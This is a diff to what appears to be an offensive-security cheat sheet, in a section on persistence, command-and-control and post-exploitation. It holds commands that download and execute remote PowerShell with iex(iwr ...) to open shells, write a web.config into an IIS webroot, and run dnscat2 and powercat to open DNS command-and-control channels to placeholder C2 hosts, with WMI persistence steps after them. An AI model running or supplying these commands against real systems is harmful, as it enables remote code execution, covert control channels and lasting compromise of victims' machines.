@@ -278,9 +278,12 @@
 	
 	# persistence, c2 via icmp, http, post exploitation
 	download_file /tmp/web.config c:/inetpub/wwwroot/css/web.config
-	(new-object net.webclient).downloadstring('<URL>/web.config')|out-file -encoding ascii -filepath c:\inetpub\wwwroot\css\web.config	
+	(new-object net.webclient).downloadstring('<URL>/web.config')|out-file -encoding ascii -filepath c:\inetpub\wwwroot\css\web.config		
 	iex(iwr http(s)://<URL>/icmp_server.ps1); invoke-shell
-	iex(iwr http(s)://<URL>/http_server.ps1); invoke-shell
+	iex(iwr http(s)://<URL>/http_server.ps1); invoke-shell	
+	ruby ./dnscat2.rb -e open --no-cache --dns=port=<LPORT>,domain=<C2DOMAIN>
+	powercat -c <C2IP> -p <DNSPORT> -dns <C2DOMAIN> -ep 
+	
 	InstallWMIPersistence <EventFilterName> <EventConsumerName>
 	SetFallbackNetwork <PRIMARYIP> <IPSUBNET>
 	InstallPersistence 1
